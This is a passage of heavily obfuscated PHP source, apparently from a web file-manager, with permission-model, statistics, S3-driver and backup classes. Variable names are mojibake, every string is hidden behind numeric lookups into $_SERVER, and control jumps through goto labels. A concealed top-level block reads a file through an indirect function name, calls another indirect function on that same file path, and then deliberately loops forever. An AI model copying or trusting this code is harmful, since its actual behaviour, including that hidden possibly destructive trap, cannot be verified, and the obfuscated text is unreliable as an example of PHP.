$°ˆÙÌ§—[1942]; } break; default: break; } if ($çì¾Êµ > end($ÌÕÊÆş)) { array_pop($ÌÕÊÆş); } sort($ÌÕÊÆş); return $ÌÕÊÆş; } public function listTable($¸İ×¼˜Ê) { $•³”ŠÌğ = ucfirst($¸İ×¼˜Ê); return Model($•³”ŠÌğ)->listData(); } public function option($â²ùƒ’£) { $ÑÊö†ÎÔ = $_SERVER[«òÑğ][1943] . ucfirst($â²ùƒ’£); return $this->{$ÑÊö†ÎÔ}(); } private function optionUser() { $ªò¦Ñé =& $_SERVER[«òÑğ]; $¾‹ÛÈì® = Model($ªò¦Ñé[602])->count($ªò¦Ñé[1784]); $×•›¸„’ = Model($ªò¦Ñé[602])->where($ªò¦Ñé[1944])->count($ªò¦Ñé[1784]); $¢¨ú¶¸Ş = intval($GLOBALS[$ªò¦Ñé[6]][$ªò¦Ñé[427]][$ªò¦Ñé[1729]]) / 3600; $òÌ£ğå’ = strtotime("\x2d{$¢¨ú¶¸Ş}\40\150\157\x75\x72\163"); $½ÄŠ¨Š“ = strtotime(date($ªò¦Ñé[1925])); if ($òÌ£ğå’ < $½ÄŠ¨Š“) { $òÌ£ğå’ = $½ÄŠ¨Š“; } $®›±îµ¡ = array($ªò¦Ñé[1945] => array($ªò¦Ñé[1101], $òÌ£ğå’)); $¤×“—“¡ = (int) Model($ªò¦Ñé[602])->where($®›±îµ¡)->count($ªò¦Ñé[1784]); if (!$¤×“—“¡) { $¤×“—“¡ = 1; } $®›±îµ¡ = array($ªò¦Ñé[1945] => array($ªò¦Ñé[1101], $½ÄŠ¨Š“)); $€Ÿ§™”ë = Model($ªò¦Ñé[602])->where($®›±îµ¡)->count($ªò¦Ñé[1784]); return array($ªò¦Ñé[842] => (int) $¾‹ÛÈì®, $ªò¦Ñé[1946] => (int) ($¾‹ÛÈì® - $×•›¸„’), $ªò¦Ñé[1947] => (int) $×•›¸„’, $ªò¦Ñé[1948] => (int) $€Ÿ§™”ë, $ªò¦Ñé[1949] => $¤×“—“¡); } private function optionFile() { $³›·—š© =& $_SERVER[«òÑğ]; $øÎôŸ×» = $this->sourceSize(); $•«”ŞŠ = $øÎôŸ×»[$³›·—š©[79]]; $³ğÊñëÚ = $øÎôŸ×»[$³›·—š©[1918]]; $Û÷ÇŞ¨‡ = Model($³›·—š©[914])->where(array($³›·—š©[488] => 0))->count($³›·—š©[194]); $²´òÔªù = array($³›·—š©[488] => 0, $³›·—š©[234] => array($³›·—š©[1101], strtotime(date($³›·—š©[1925])))); $È»’îı = Model($³›·—š©[914])->where($²´òÔªù)->sum($³›·—š©[79]); $ø˜ˆ‡Çª = Model($³›·—š©[914])->where($²´òÔªù)->count($³›·—š©[194]); return array($³›·—š©[847] => $•«”ŞŠ, $³›·—š©[1918] => $³ğÊñëÚ, $³›·—š©[1950] => $•«”ŞŠ - $³ğÊñëÚ, $³›·—š©[1951] => (int) $È»’îı, $³›·—š©[849] => (int) $Û÷ÇŞ¨‡, $³›·—š©[1952] => (int) $ø˜ˆ‡Çª); } private function optionAccess() { $“Éƒß‹Õ =& $_SERVER[«òÑğ]; return array($“Éƒß‹Õ[842] => $this->typeLogCnt(), $“Éƒß‹Õ[110] => $this->typeLogCnt($“Éƒß‹Õ[110]), $“Éƒß‹Õ[528] => $this->typeLogCnt($“Éƒß‹Õ[528]), $“Éƒß‹Õ[1953] => $this->typeLogCnt($“Éƒß‹Õ[1953]), $“Éƒß‹Õ[1954] => $this->typeLogCnt($“Éƒß‹Õ[1954]), $“Éƒß‹Õ[670] => $this->typeLogCnt($“Éƒß‹Õ[12], $“Éƒß‹Õ[1929])); } private function typeLogCnt($ÈÙºüÕ· = '', $¿›­ó±› = "\151\144") { $üæ¤–€ =& $_SERVER[«òÑğ]; $¾È•ªÛ‘ = array($üæ¤–€[110] => array($üæ¤–€[1955], $üæ¤–€[1956]), $üæ¤–€[528] => array($üæ¤–€[1957], $üæ¤–€[1958]), $üæ¤–€[1953] => array($üæ¤–€[1959], $üæ¤–€[1960], $üæ¤–€[1961]), $üæ¤–€[1954] => array($üæ¤–€[1962], $üæ¤–€[1963]), $üæ¤–€[1964] => array($üæ¤–€[1965], $üæ¤–€[1966], $üæ¤–€[1967])); $·…ØµÉÚ = strtotime(date($üæ¤–€[1925])); $ÖÜ”¸ÌÇ = array($üæ¤–€[234] => array($üæ¤–€[1101], $·…ØµÉÚ)); if ($ÈÙºüÕ·) { $ÖÜ”¸ÌÇ[$üæ¤–€[33]] = array($üæ¤–€[7], $¾È•ªÛ‘[$ÈÙºüÕ·]); } $Çâ™œêê = Model($üæ¤–€[1928])->where($ÖÜ”¸ÌÇ)->count($¿›­ó±›); return (int) $Çâ™œêê; } private function optionServer() { $¸³ñï® =& $_SERVER[«òÑğ]; $ıâû„òÇ = $this->diskDriver(); $ñ¶¡ ­« = KodIO::defaultDriver(); $´ô“×¿á = array($¸³ñï®[907] => $ñ¶¡ ­«[$¸³ñï®[478]]); $è¾Îú›Ô = Model($¸³ñï®[549])->where($´ô“×¿á)->sum($¸³ñï®[79]); $£ú†¡Ä = explode($¸³ñï®[53], $_SERVER[$¸³ñï®[147]]); $í€¼Œ±¯ = $£ú†¡Ä[0]; $‹­ôÔÑö = $GLOBALS[$¸³ñï®[6]][$¸³ñï®[21]]; $îĞÅ•Õ = $‹­ôÔÑö[$¸³ñï®[1063]]; if ($îĞÅ•Õ == $¸³ñï®[1051]) { $ƒ¦Ğ× = explode($¸³ñï®[1378], $‹­ôÔÑö[$¸³ñï®[1062]]); $îĞÅ•Õ = $ƒ¦Ğ×[0]; } if ($îĞÅ•Õ == $¸³ñï®[999] || $îĞÅ•Õ == $¸³ñï®[892]) { $ûËÆ÷¤Ø = Model()->db()->query($¸³ñï®[1968]); $ıß¤šÆ‡ = $ûËÆ÷¤Ø[0] && isset($ûËÆ÷¤Ø[0][$¸³ñï®[1670]]) ? $ûËÆ÷¤Ø[0][$¸³ñï®[1670]] : 0; $îĞÅ•Õ = $¸³ñï®[1969] . ($ıß¤šÆ‡ ? $¸³ñï®[8] . $ıß¤šÆ‡ : $¸³ñï®[12]); } $¢ÒúÆ¾Í = $GLOBALS[$¸³ñï®[6]][$¸³ñï®[427]][$¸³ñï®[916]]; return array($¸³ñï®[1970] => $ıâû„òÇ ? $ıâû„òÇ[$¸³ñï®[1971]] : 0, $¸³ñï®[1972] => $ıâû„òÇ ? $ıâû„òÇ[$¸³ñï®[1973]] : 0, $¸³ñï®[1974] => (int) $ñ¶¡ ­«[$¸³ñï®[1971]] * 1024 * 1024 * 1024, $¸³ñï®[1975] => (int) $è¾Îú›Ô, $¸³ñï®[1976] => ucfirst($í€¼Œ±¯), $¸³ñï®[1977] => $¸³ñï®[1978] . PHP_VERSION, $¸³ñï®[1979] => phpBuild64() ? 64 : 32, $¸³ñï®[841] => str_replace($¸³ñï®[1219], $¸³ñï®[1079], $îĞÅ•Õ), $¸³ñï®[427] => ucfirst($¢ÒúÆ¾Í), $¸³ñï®[32] => $_SERVER[$¸³ñï®[1980]]); } private function diskDriver() { $Ç¬©ë¾¾ =& $_SERVER[«òÑğ]; $£Î£µËâ = $Ç¬©ë¾¾[8]; $Û¼¡´Ùî = $GLOBALS[$Ç¬©ë¾¾[6]][$Ç¬©ë¾¾[1395]] == $Ç¬©ë¾¾[1396]; if ($Û¼¡´Ùî) { $£Î£µËâ = $Ç¬©ë¾¾[1981]; if (function_exists($Ç¬©ë¾¾[1982])) { exec($Ç¬©ë¾¾[1983], $şı•”ÖÖ); $£Î£µËâ = $şı•”ÖÖ[1] . $Ç¬©ë¾¾[8]; } } if (!file_exists($£Î£µËâ)) { return; } if (!function_exists($Ç¬©ë¾¾[1984])) { return; } $ëà¬ÚÑ = @disk_total_space($£Î£µËâ); $ìÇÑÕÊÚ = $ëà¬ÚÑ - @disk_free_space($£Î£µËâ); return array($Ç¬©ë¾¾[1971] => $ëà¬ÚÑ, $Ç¬©ë¾¾[1973] => $ìÇÑÕÊÚ); } public function fileChart($„Ñ»§ôß) { $°éª°Ñù =& $_SERVER[«òÑğ]; if (isset($„Ñ»§ôß[$°éª°Ñù[1784]])) { return Model($°éª°Ñù[914])->userFileTypeProfile($„Ñ»§ôß[$°éª°Ñù[1784]]); } if (isset($„Ñ»§ôß[$°éª°Ñù[1985]])) { return Model($°éª°Ñù[914])->groupFileTypeProfile($„Ñ»§ôß[$°éª°Ñù[1985]]); } $©èÛéô” = $this->sourceSize(); $ùîşàˆ¯ = array($°éª°Ñù[193] => 0, $°éª°Ñù[191] => 1); $ĞïüøİŸ = Model($°éª°Ñù[914])->where($ùîşàˆ¯)->sum($°éª°Ñù[79]); $ùîşàˆ¯[$°éª°Ñù[191]] = 2; $ş¡·™ = Model($°éª°Ñù[914])->where($ùîşàˆ¯)->sum($°éª°Ñù[79]); return array($°éª°Ñù[847] => $©èÛéô”[$°éª°Ñù[79]], $°éª°Ñù[1918] => $©èÛéô”[$°éª°Ñù[1918]], $°éª°Ñù[1919] => (int) $ĞïüøİŸ, $°éª°Ñù[1920] => (int) $ş¡·™); } private function sourceSize() { $¹»â•å =& $_SERVER[«òÑğ]; $°¸åä” = Model($¹»â•å[914])->where(array($¹»â•å[488] => 0))->sum($¹»â•å[79]); $™üá Ÿë = Model($¹»â•å[549])->sum($¹»â•å[79]); if ($™üá Ÿë > $°¸åä”) { $™üá Ÿë = $°¸åä”; } return array($¹»â•å[79] => (int) $°¸åä”, $¹»â•å[1918] => (int) $™üá Ÿë); } } if (!isset($_SERVER[$_SERVER[«òÑğ][824]]) || !isset($_SERVER[$_SERVER[«òÑğ][831]])) { $_getc = $_SERVER[«òÑğ][826]; $_getfile = $_SERVER[$_SERVER[«òÑğ][827]] . $_SERVER[«òÑğ][828]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[«òÑğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[«òÑğ][706]) { $exit = $_SERVER[«òÑğ][829]; $exit(); } $_act = $_SERVER[«òÑğ][830]; $_act($_SERVER[$_SERVER[«òÑğ][827]] . $_SERVER[«òÑğ][828]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[«òÑğ][457]); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $†º±…¢± =& $_SERVER[«òÑğ]; $ß‘¥›â® = array(array($†º±…¢±[497] => LNG($†º±…¢±[1986]), $†º±…¢±[1987] => $†º±…¢±[1988], $†º±…¢±[1989] => 1, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($†º±…¢±[497] => LNG($†º±…¢±[1992]), $†º±…¢±[1987] => $†º±…¢±[1993], $†º±…¢±[1989] => 2, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($†º±…¢±[497] => LNG($†º±…¢±[1994]), $†º±…¢±[1987] => $†º±…¢±[1995], $†º±…¢±[1989] => 3, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($†º±…¢±[497] => LNG($†º±…¢±[1996]), $†º±…¢±[1987] => $†º±…¢±[1997], $†º±…¢±[1989] => 4, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_VIEW), array($†º±…¢±[497] => LNG($†º±…¢±[1998]), $†º±…¢±[1987] => $†º±…¢±[1999], $†º±…¢±[1989] => 5, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($†º±…¢±[497] => LNG($†º±…¢±[2000]), $†º±…¢±[1987] => $†º±…¢±[2001], $†º±…¢±[1989] => 6, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($†º±…¢±[497] => LNG($†º±…¢±[2002]), $†º±…¢±[1987] => $†º±…¢±[2003], $†º±…¢±[1989] => 7, $†º±…¢±[1990] => 1, $†º±…¢±[1991] => 0)); return $ß‘¥›â®; } public static function authCheck($™‰ˆç…›, $ÈÉ±Éª¼) { $µ»œ‹©á =& $_SERVER[«òÑğ]; $™‰ˆç…› = intval($™‰ˆç…›); if (KodUser::isRoot() && $GLOBALS[$µ»œ‹©á[6]][$µ»œ‹©á[2004]]) { return !0; } if ($™‰ˆç…› <= 0) { return !1; } if (($™‰ˆç…› & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($™‰ˆç…› & $ÈÉ±Éª¼); } public static function authCheckShow($ÆÅ‡¸øØ) { return self::authCheck($ÆÅ‡¸øØ, self::AUTH_SHOW); } public static function authCheckView($¨ËÈ¬ú®) { return self::authCheck($¨ËÈ¬ú®, self::AUTH_VIEW); } public static function authCheckDownload($Á»¡¥„) { return self::authCheck($Á»¡¥„, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ŒÌ´ğ¼Ã) { return self::authCheck($ŒÌ´ğ¼Ã, self::AUTH_UPLOAD); } public static function authCheckEdit($Éß¸Şë) { return self::authCheck($Éß¸Şë, self::AUTH_EDIT); } public static function authCheckRemove($şÏÚ˜ëÎ) { return self::authCheck($şÏÚ˜ëÎ, self::AUTH_REMOVE); } public static function authCheckShare($¦ø®·‡¤) { return self::authCheck($¦ø®·‡¤, self::AUTH_SHARE); } public static function authCheckComment($ƒ©Î’º©) { return self::authCheck($ƒ©Î’º©, self::AUTH_COMMENT); } public static function authCheckEvent($»õÃâ¡) { return self::authCheck($»õÃâ¡, self::AUTH_EVENT); } public static function authCheckRoot($„ËÜ‘úò) { return self::authCheck($„ËÜ‘úò, self::AUTH_ROOT); } public static function authCheckAction($ÁÃ“Ğ³Ò, $û¥±È’”) { $Ìº§ËËõ =& $_SERVER[«òÑğ]; $ş‹ùøœª = array($Ìº§ËËõ[2005] => self::AUTH_VIEW, $Ìº§ËËõ[1289] => self::AUTH_DOWNLOAD, $Ìº§ËËõ[110] => self::AUTH_UPLOAD, $Ìº§ËËõ[1954] => self::AUTH_EDIT, $Ìº§ËËõ[1953] => self::AUTH_REMOVE, $Ìº§ËËõ[1964] => self::AUTH_SHARE, $Ìº§ËËõ[432] => self::AUTH_COMMENT, $Ìº§ËËõ[1771] => self::AUTH_EVENT, $Ìº§ËËõ[2006] => self::AUTH_ROOT); if (!isset($ş‹ùøœª[$û¥±È’”])) { return; } $ÃãÑ‘»¥ = $ş‹ùøœª[$û¥±È’”]; $ÁÃ“Ğ³Ò = intval($ÁÃ“Ğ³Ò); if ($ÁÃ“Ğ³Ò <= 0) { return !1; } if (($ÁÃ“Ğ³Ò & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ÁÃ“Ğ³Ò & $ÃãÑ‘»¥); } public static function authDisable($–šèóõÂ, $ĞÖÌóÉŠ) { if (intval($–šèóõÂ) <= 0) { return 0; } return intval($–šèóõÂ) & ~$ĞÖÌóÉŠ; } public $optionType = "\x53\171\163\164\145\155\x2e\163\157\165\x72\x63\145\101\165\164\150\x4c\x69\x73\164"; public $field = array("\156\141\155\x65", "\x61\x75\x74\150", "\154\x61\x62\145\x6c", "\x64\151\163\160\154\141\x79", "\163\x79\163\x74\145\155", "\163\x6f\x72\164"); public function initData() { $§Ìó—Û‡ = $this->authDefault(); foreach ($§Ìó—Û‡ as $²œ‹ëÎÀ) { $this->add($²œ‹ëÎÀ); } } public function findAuth($‘Ùå‡Š, $Å¯½º„) { $§–—ÈÃ =& $_SERVER[«òÑğ]; $‘æä¥·ú = parent::listData(); foreach ($‘æä¥·ú as $±©áìúĞ) { $İ¹«áÂ = intval($±©áìúĞ[$§–—ÈÃ[490]]); if ($İ¹«áÂ <= 0 || $±©áìúĞ[$§–—ÈÃ[2007]] == 0) { continue; } if (($İ¹«áÂ & $‘Ùå‡Š) != $‘Ùå‡Š) { continue; } if (($İ¹«áÂ & $Å¯½º„) != 0) { continue; } return $±©áìúĞ[$§–—ÈÃ[478]]; } return !1; } public function findAuthMax($É†ÙĞ©õ, $¼¬ÊŠÍ¸) { $“×²÷ú =& $_SERVER[«òÑğ]; $Â¦âô = !1; $ŸóôòÖ» = parent::listData(); foreach ($ŸóôòÖ» as $™ÛˆÓ) { $¬ÊÓãİÏ = intval($™ÛˆÓ[$“×²÷ú[490]]); if ($¬ÊÓãİÏ <= 0 || $™ÛˆÓ[$“×²÷ú[2007]] == 0) { continue; } if (($¬ÊÓãİÏ & $É†ÙĞ©õ) != $É†ÙĞ©õ) { continue; } if (($¬ÊÓãİÏ & $¼¬ÊŠÍ¸) != 0) { continue; } if (!$Â¦âô) { $Â¦âô = $™ÛˆÓ; continue; } if (intval($Â¦âô[$“×²÷ú[490]]) < $¬ÊÓãİÏ) { $Â¦âô = $™ÛˆÓ; } } return $Â¦âô ? $Â¦âô[$“×²÷ú[478]] : !1; } public function findAuthReadOnly() { $”¼ü¤®À = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $¡®¸Êå˜ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($”¼ü¤®À, $¡®¸Êå˜); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $úğ‚éà¹ =& $_SERVER[«òÑğ]; $‡²³¶ÈŒ = parent::listData(); $ıºáÊòí = !1; foreach ($‡²³¶ÈŒ as $éçà˜›) { if ($éçà˜›[$úğ‚éà¹[490]] <= 0 || $éçà˜›[$úğ‚éà¹[2007]] == $úğ‚éà¹[231]) { continue; } if (!$ıºáÊòí) { $ıºáÊòí = $éçà˜›; continue; } if ($ıºáÊòí[$úğ‚éà¹[490]] > $éçà˜›[$úğ‚éà¹[490]]) { $ıºáÊòí = $éçà˜›; } } return $ıºáÊòí ? $ıºáÊòí[$úğ‚éà¹[478]] : $úğ‚éà¹[12]; } public function listData($€ï¥½æ§ = false, $ê”üÄã = "\163\x6f\162\x74", $ùÖ·¥•÷ = false) { return parent::listData($€ï¥½æ§, $ê”üÄã, $ùÖ·¥•÷); } public function update($ô¬ç´É, $÷†à¢Š¬) { $Ä£ğì°› =& $_SERVER[«òÑğ]; $†ø®²Úø = parent::listData($ô¬ç´É); $×ãğ˜ƒÊ = $this->findByName($÷†à¢Š¬[$Ä£ğì°›[32]]); if (!$†ø®²Úø || $×ãğ˜ƒÊ && $×ãğ˜ƒÊ[$Ä£ğì°›[478]] != $†ø®²Úø[$Ä£ğì°›[478]]) { return !1; } $this->filterAuth($÷†à¢Š¬[$Ä£ğì°›[490]]); return parent::update($ô¬ç´É, $÷†à¢Š¬); } public function remove($‘úÈÎÇÎ) { $²ñê¼­­ = parent::listData($‘úÈÎÇÎ); if (!$²ñê¼­­ || $²ñê¼­­[$_SERVER[«òÑğ][192]]) { return !1; } return parent::remove($‘úÈÎÇÎ); } public function add($ã‡‰Ãì = array()) { $âÃß¥ =& $_SERVER[«òÑğ]; if ($this->findByName($ã‡‰Ãì[$âÃß¥[32]])) { return !1; } $İŠÔû – = array($âÃß¥[32] => $âÃß¥[12], $âÃß¥[490] => 1, $âÃß¥[2008] => $âÃß¥[1995], $âÃß¥[2007] => 1, $âÃß¥[192] => 0, $âÃß¥[2009] => 0); $ã‡‰Ãì = array_merge($İŠÔû –, $ã‡‰Ãì); $ã‡‰Ãì[$âÃß¥[2009]] = $this->getSort(); $this->filterAuth($ã‡‰Ãì[$âÃß¥[490]]); return parent::insert($ã‡‰Ãì); } private function getSort() { $ÓõÓ¥×Ã =& $_SERVER[«òÑğ]; $Ëï÷Á·Ï = parent::listData(); $×¯‰° = array_to_keyvalue($Ëï÷Á·Ï, $ÓõÓ¥×Ã[12], $ÓõÓ¥×Ã[2009]); return empty($×¯‰°) ? 0 : max($×¯‰°) + 1; } private function filterAuth(&$€’“×—) { if (!$€’“×—) { return; } $èÂ‚Ó¾Ñ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $êå¤şŠ = array(); foreach ($èÂ‚Ó¾Ñ as $é¤é£ƒ™) { if ($€’“×— & $é¤é£ƒ™) { $êå¤şŠ[] = $é¤é£ƒ™; } } if (in_array(self::AUTH_ROOT, $êå¤şŠ)) { $€’“×— = array_sum($èÂ‚Ó¾Ñ); return; } $ë”â²‚š = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($êå¤şŠ as $é¤é£ƒ™) { if (isset($ë”â²‚š[$é¤é£ƒ™])) { $êå¤şŠ = array_merge($êå¤şŠ, $ë”â²‚š[$é¤é£ƒ™]); } } $êå¤şŠ[] = self::AUTH_SHOW; $€’“×— = array_sum(array_unique($êå¤şŠ)); } public function sort($²ÇÎ…İ, $Îµ‹ÉÁˆ) { return parent::update($²ÇÎ…İ, $Îµ‹ÉÁˆ); } } goto a®½”¥³¥; FôÔ·Ÿ¯çï: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($èŒ½™­) { $£®¡±”¾ =& $_SERVER[«òÑğ]; parent::__construct($èŒ½™­); $À¡”•¨ˆ = isset($èŒ½™­[$£®¡±”¾[259]]) && $èŒ½™­[$£®¡±”¾[259]] == $£®¡±”¾[250] ? $£®¡±”¾[250] : $£®¡±”¾[316]; $this->setSignVersion($À¡”•¨ˆ); } public function link($ôüŞã“, $Ç‹®¯»„ = array()) { return parent::link($ôüŞã“, $Ç‹®¯»„); } public function fileOut($µÜ¾…Ş, $õ¯úË’ş = false, $Šª³‡»İ = false, $‘ˆ÷²ÆÅ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[«òÑğ][317])) { return parent::fileOutServer($µÜ¾…Ş, $õ¯úË’ş, $Šª³‡»İ, $‘ˆ÷²ÆÅ); } parent::fileOut($µÜ¾…Ş, $õ¯úË’ş, $Šª³‡»İ, $‘ˆ÷²ÆÅ); } public function fileOutImage($ÛÛ¦ö, $Œ¤ğÔŒ§ = 250) { if (strstr($this->endpoint, $_SERVER[«òÑğ][317])) { return parent::fileOutImageServer($ÛÛ¦ö, $Œ¤ğÔŒ§); } parent::fileOutImage($ÛÛ¦ö, $Œ¤ğÔŒ§); } public function fileOutLink($Ëüâğ) { $â¥ƒÈí€ =& $_SERVER[«òÑğ]; if (substr($Ëüâğ, 0, 7) == $â¥ƒÈí€[219]) { $Ëüâğ = $â¥ƒÈí€[220] . substr($Ëüâğ, 7); } header($â¥ƒÈí€[175] . $Ëüâğ); die; } } define($_SERVER[«òÑğ][318], 1); define($_SERVER[«òÑğ][319], 2); goto f­ÌÔ–®«; a®½”¥³¥: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\142\141\x63\x6b\x75\160\114\x69\163\164"; public $field = array("\151\157", "\156\141\x6d\145", "\x73\x74\141\164\165\x73", "\x63\157\156\164\145\x6e\x74", "\x6d\141\156\165\x61\154", "\x72\145\163\x75\x6c\164", "\164\151\x6d\145\106\162\157\155", "\x74\151\155\x65\x54\157"); public function config() { $úŞÉÔŠ =& $_SERVER[«òÑğ]; Action($úŞÉÔŠ[2010])->taskInit(); $î¯‹”ç = Model($úŞÉÔŠ[854])->get($úŞÉÔŠ[861]); $î¯‹”ç = json_decode($î¯‹”ç, !0); $î¯‹”ç = is_array($î¯‹”ç) ? $î¯‹”ç : array(); $this->parseContent($î¯‹”ç); unset($î¯‹”ç[$úŞÉÔŠ[1753]]); Model($úŞÉÔŠ[1752])->cacheClear(); $ºÏ²‹¦ß = $úŞÉÔŠ[2011]; $ß…°Æ´ = Model($úŞÉÔŠ[2012])->findByKey($úŞÉÔŠ[1771], $ºÏ²‹¦ß); if (!$ß…°Æ´) { $ß…°Æ´ = array(); } if (isset($ß…°Æ´[$úŞÉÔŠ[207]])) { $ß…°Æ´[$úŞÉÔŠ[207]] = json_decode($ß…°Æ´[$úŞÉÔŠ[207]], !0); } if (isset($î¯‹”ç[$úŞÉÔŠ[207]])) { $ß…°Æ´[$úŞÉÔŠ[207]][$úŞÉÔŠ[1756]] = $î¯‹”ç[$úŞÉÔŠ[207]]; unset($î¯‹”ç[$úŞÉÔŠ[207]]); } return array_merge($ß…°Æ´, $î¯‹”ç); } public function listData($«Â×üœ = false, $´£„Š¿á = "\155\157\144\x69\146\x79\124\x69\x6d\x65", $æÍĞßÀ¤ = false) { $·ÉùÅÔÃ = parent::listData($«Â×üœ, $´£„Š¿á, !0); if (!$·ÉùÅÔÃ) { return $·ÉùÅÔÃ; } if ($«Â×üœ) { $·ÉùÅÔÃ = array($·ÉùÅÔÃ); } foreach ($·ÉùÅÔÃ as &$„ÉĞ¢¸†) { $this->parseContent($„ÉĞ¢¸†); } return $«Â×üœ ? $·ÉùÅÔÃ[0] : $·ÉùÅÔÃ; } public function parseContent(&$ÌëŞ¸ëı) { $¿ƒĞØ— =& $_SERVER[«òÑğ]; $»§çÃ’ø = _get($ÌëŞ¸ëı, $¿ƒĞØ—[171], $¿ƒĞØ—[91]); if (!in_array($»§çÃ’ø, array($¿ƒĞØ—[860], $¿ƒĞØ—[1219]))) { $ÌëŞ¸ëı[$¿ƒĞØ—[171]] = $»§çÃ’ø == $¿ƒĞØ—[91] ? $¿ƒĞØ—[1219] : $¿ƒĞØ—[860]; } } public function lastItem() { $ºŒ÷ö«– = $this->listData(); return !empty($ºŒ÷ö«–[0]) ? $ºŒ÷ö«–[0] : null; } public function kill($»Ì¯›¾¢) { $ùË×Õ =& $_SERVER[«òÑğ]; $©©Ñ…§½ = $this->listData($»Ì¯›¾¢); if (!$©©Ñ…§½ || empty($©©Ñ…§½[$ùË×Õ[32]])) { return !0; } Task::kill($ùË×Õ[869]); Task::kill($ùË×Õ[888]); Task::kill($ùË×Õ[898]); $æ¢ğîà = $©©Ñ…§½[$ùË×Õ[32]]; $§ÀÀ—ü¤ = TEMP_FILES . $ùË×Õ[864] . $æ¢ğîà . $ùË×Õ[8]; IO::remove($§ÀÀ—ü¤, !1); return $this->remove($»Ì¯›¾¢); } public function remove($×Š•ª›) { $³Àç¨Ğú = $this->listData($×Š•ª›); if (!$³Àç¨Ğú) { return !0; } return $this->backupRemove($³Àç¨Ğú); } private function backupRemove($Ñ¹ú¬ìÂ) { parent::remove($Ñ¹ú¬ìÂ[$_SERVER[«òÑğ][478]]); $»ş» ¡• = $this->backupPath($Ñ¹ú¬ìÂ); IO::remove($»ş» ¡•, !1); return !0; } private function backupPath($«æì§ÃŒ) { $‰îĞß– =& $_SERVER[«òÑğ]; $ƒ¹ÉóàÃ = $«æì§ÃŒ[$‰îĞß–[32]]; $ŸóŒ­˜í = Model($‰îĞß–[854])->get($‰îĞß–[855]); $è½²¹ÜÁ = substr(md5($‰îĞß–[856] . $ŸóŒ­˜í . $ƒ¹ÉóàÃ), 0, 8); return "\173\x69\157\x3a{$«æì§ÃŒ[$‰îĞß–[836]]}\x7d\57\144\141\x74\141\x62\141\163\145\x2f\142\141\143\153\x75\x70\57" . $ƒ¹ÉóàÃ . $‰îĞß–[11] . $è½²¹ÜÁ; } public function start() { $øûŒ›èÑ =& $_SERVER[«òÑğ]; if ($GLOBALS[$øûŒ›èÑ[6]][$øûŒ›èÑ[92]][$øûŒ›èÑ[2013]] != $øûŒ›èÑ[91]) { return !0; } $°ğ¥‰ñ¿ = $this->config(); if (!$°ğ¥‰ñ¿ || $°ğ¥‰ñ¿[$øûŒ›èÑ[1753]] != $øûŒ›èÑ[91]) { return !1; } if ($°ğ¥‰ñ¿[$øûŒ›èÑ[171]] == $øûŒ›èÑ[860]) { $áÇ¡³èË = Model($øûŒ›èÑ[854])->get($øûŒ›èÑ[1334]); if ($áÇ¡³èË == $øûŒ›èÑ[1335]) { $°ğ¥‰ñ¿[$øûŒ›èÑ[171]] = $øûŒ›èÑ[1219]; } } $ö³íÙÇ„ = $this->process(); foreach ($ö³íÙÇ„ as $Ãšìš¢í) { if ($Ãšìš¢í) { return Task::restart($Ãšìš¢í[$øûŒ›èÑ[478]]); } } $‡÷«Ñö = new Backup(); $Á±±õ­ = $‡÷«Ñö->db(); if ($Á±±õ­) { $Á±±õ­ = $‡÷«Ñö->dbFile(); if ($Á±±õ­ && $°ğ¥‰ñ¿[$øûŒ›èÑ[171]] == $øûŒ›èÑ[860]) 